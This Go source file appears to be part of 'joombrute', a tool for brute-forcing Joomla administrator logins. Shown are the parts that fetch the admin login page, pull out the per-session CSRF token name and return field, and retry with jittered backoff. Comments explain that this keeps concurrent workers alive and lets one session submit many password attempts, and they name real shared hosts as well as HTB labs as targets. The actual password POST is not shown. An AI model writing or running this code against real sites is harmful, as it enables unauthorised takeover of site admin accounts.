package joomla

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/rvzsec/joombrute/internal/httpx"
)

// FetchLoginFormWithRetry wraps FetchLoginForm with bounded retries +
// jittered backoff. Joomla's first-hit /administrator/ GET allocates a
// session row in the DB; under concurrent worker startup the losing
// workers sometimes get a 500 from a session-init race. Real targets
// (HTB labs, shared hosts behind a CDN) also stutter on the cold path.
//
// Without retry, a worker that loses the first race dies for the whole
// run, slashing effective concurrency. With retry, a single 500 costs
// ~200-700 ms instead of an entire worker slot.
//
// Returns on first success. Returns the last error after `attempts`
// failed tries. Respects ctx cancellation between attempts.
func FetchLoginFormWithRetry(ctx context.Context, client *http.Client, t *Target, attempts int) (*LoginForm, error) {
	if attempts < 1 {
		attempts = 1
	}
	var lastErr error
	for i := 0; i < attempts; i++ {
		form, err := FetchLoginForm(ctx, client, t)
		if err == nil {
			return form, nil
		}
		lastErr = err
		if i == attempts-1 {
			break
		}
		// Jittered backoff: 150ms base + up to 350ms jitter per attempt.
		// Keeps concurrent workers from re-racing in lockstep.
		backoff := time.Duration(150+rand.Intn(350)) * time.Millisecond
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-time.After(backoff):
		}
	}
	return nil, fmt.Errorf("fetch form failed after %d attempts: %w", attempts, lastErr)
}

// LoginForm is everything we need to POST a credential attempt.
//
// In Joomla 3.x/4.x/5.x the admin login form is rendered at
// /administrator/index.php with:
//
//	method  : POST
//	action  : the same /administrator/index.php (relative or absolute)
//	fields  : username, passwd, option=com_login, task=login, return=<base64>
//	token   : a session-scoped hidden input where the *name* is a 32-char
//	          hex string (CSRF token name itself), value is always "1".
//
// Joomla rotates the token-name per session, NOT per request. So the same
// session+cookie can submit multiple password attempts without re-fetching
// the form. We still refresh periodically (configurable) because some
// hardened deploys (Admin Tools, RSFirewall) shorten session lifetimes.
type LoginForm struct {
	// Action is the absolute URL we POST to.
	Action string
	// TokenName is the 32-hex CSRF field name. Its value is always "1".
	TokenName string
	// ReturnValue is the base64 "return" field - Joomla post-login redirect.
	ReturnValue string
}

// reTokenName matches Joomla's CSRF token field name. The name is itself a
// random MD5 hex string; the value is always "1". Two forms exist:
//
//	<input type="hidden" name="abc123..." value="1" />
//	<input type="hidden" name="abc123..." value="1">
//
// Constraints: exactly 32 lowercase hex chars, value is literally "1".
var reTokenName = regexp.MustCompile(`<input[^>]+type=["']hidden["'][^>]+name=["']([a-f0-9]{32})["'][^>]+value=["']1["']`)

// FetchLoginForm GETs the admin login page on client and returns everything
// needed to POST a credential attempt. The client's cookie jar will now hold
// the session cookie required for the subsequent POST.
func FetchLoginForm(ctx context.Context, client *http.Client, t *Target) (*LoginForm, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, t.AdminURL(), nil)
	if err != nil {
		return nil, err
	}
	httpx.SetUA(req, "")
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("GET admin: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("admin page returned %d", resp.StatusCode)
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("parse admin html: %w", err)
	}

	form := &LoginForm{
		Action: t.AdminURL(), // sane default; refined below
	}

	// Form action - prefer the actual form element, fall back to the default.
	// Both J3 and J4/J5 use id="form-login".
	if action, ok := doc.Find("form#form-login").Attr("action"); ok && action != "" {
		form.Action = resolveAction(t.AdminURL(), action)
	}

	// Extract CSRF token via goquery first (preferred), regex fallback.
	doc.Find(`form#form-login input[type="hidden"]`).EachWithBreak(func(_ int, s *goquery.Selection) bool {
		name, _ := s.Attr("name")
		val, _ := s.Attr("value")
		if val == "1" && isHex32(name) {
			form.TokenName = name
			return false // stop iterating
		}
		return true
	})

	// Capture the "return" hidden input - Joomla wants this echoed back.
	if v, ok := doc.Find(`form#form-login input[name="return"]`).First().Attr("value"); ok {
		form.ReturnValue = v
	}
	if form.ReturnValue == "" {
		// Sensible default the Joomla docs+source use everywhere.
		form.ReturnValue = "aW5kZXgucGhw" // base64("index.php")
	}

	// Regex fallback when the HTML is malformed enough to choke goquery's
	// attribute selectors (seen on some heavily-customized templates).
	if form.TokenName == "" {
		// Need to re-read the body - already consumed by goquery. Re-fetch
		// rather than buffering twice; cheap enough and keeps memory flat.
		if name, err := regrabToken(ctx, client, t); err == nil {
			form.TokenName = name
		}
	}

	if form.TokenName == "" {
		return nil, fmt.Errorf("could not locate CSRF token on admin login page")
	}

	return form, nil
}

// regrabToken re-fetches the admin page and runs the regex fallback. Only
// invoked when goquery extraction returned empty, which is rare.
func regrabToken(ctx context.Context, client *http.Client, t *Target) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, t.AdminURL(), nil)
	if err != nil {
		return "", err
	}
	httpx.SetUA(req, "")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	buf := make([]byte, 256*1024)
	n, _ := resp.Body.Read(buf)
	m := reTokenName.FindSubmatch(buf[:n])
	if len(m) < 2 {
		return "", fmt.Errorf("token regex miss")
	}
	return string(m[1]), nil
}

// isHex32 reports whether s is exactly 32 lowercase hex chars.
func isHex32(s string) bool {
	if len(s) != 32 {
		return false
	}
	for _, c := range s {
		switch {
		case c >= '0' && c <= '9':
		case c >= 'a' && c <= 'f':
		default:
			return false
		}
	}
	return true
}

// resolveAction turns whatever's in the form's action attribute into an
// absolute URL. Joomla typically emits an absolute path on a relative URL.
func resolveAction(baseAdminURL, action string) string {
	action = strings.TrimSpace(action)
	switch {
	case action == "":
		return baseAdminURL
	case strings.HasPrefix(action, "http://") || strings.HasPrefix(action, "https://"):
		return action
	case strings.HasPrefix(action, "/"):
		// Strip path from baseAdminURL to get scheme+host.
		// baseAdminURL = "http://host/administrator/"
		if i := strings.Index(baseAdminURL, "://"); i > 0 {
			if j := strings.Index(baseAdminURL[i+3:], "/"); j > 0 {
				return baseAdminURL[:i+3+j] + action
			}
			return baseAdminURL + action
		}
		return action
	default:
		return baseAdminURL + action
	}
}
